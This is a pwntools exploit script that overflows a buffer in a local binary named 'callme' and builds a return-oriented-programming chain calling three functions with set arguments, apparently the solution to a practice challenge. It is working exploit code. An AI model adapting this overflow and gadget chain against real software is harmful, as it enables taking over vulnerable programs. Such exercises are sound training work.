#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./callme', checksec=False)
p = process()
context.log_level = 'info' # i put it in debug mode for when testing

offset = b'a' * 40 # found with pwndbg

# pop rdi; pop rsi; pop rdx; ret;
pop_gadgets = 0x40093c

# payload for each one callme function with their parameters
payload1 = offset
payload1 += p64(pop_gadgets)
payload1 += p64(0xdeadbeefdeadbeef)
payload1 += p64(0xcafebabecafebabe)
payload1 += p64(0xd00df00dd00df00d)
payload1 += p64(elf.symbols.callme_one)

payload2 = p64(pop_gadgets)
payload2 += p64(0xdeadbeefdeadbeef)
payload2 += p64(0xcafebabecafebabe)
payload2 += p64(0xd00df00dd00df00d)
payload2 += p64(elf.symbols.callme_two)

payload3 = p64(pop_gadgets)
payload3 += p64(0xdeadbeefdeadbeef)
payload3 += p64(0xcafebabecafebabe)
payload3 += p64(0xd00df00dd00df00d)
payload3 += p64(elf.symbols.callme_three)

# craft the final payload
payload = payload1 + payload2 + payload3

p.sendlineafter(b'>', payload)
log.info(p.recvall())
